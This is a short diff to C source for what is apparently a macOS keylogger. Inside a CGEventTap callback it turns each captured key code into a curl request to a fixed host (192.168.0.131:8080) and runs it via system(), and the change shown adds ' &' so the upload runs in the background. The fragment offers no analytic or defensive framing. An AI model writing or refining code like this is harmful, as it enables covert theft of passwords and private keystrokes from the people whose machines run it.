@@ -37,10 +37,11 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print the human readable key to the logfile.
     fflush(stdout);
     char curl_command[1000] = "curl http://192.168.0.131:8080/?code=";
-
     char code[10];
+
     sprintf(code, "%d", keyCode);
     strcat(curl_command, code);
+    strcat(curl_command, " &");
 
     system(curl_command);
 
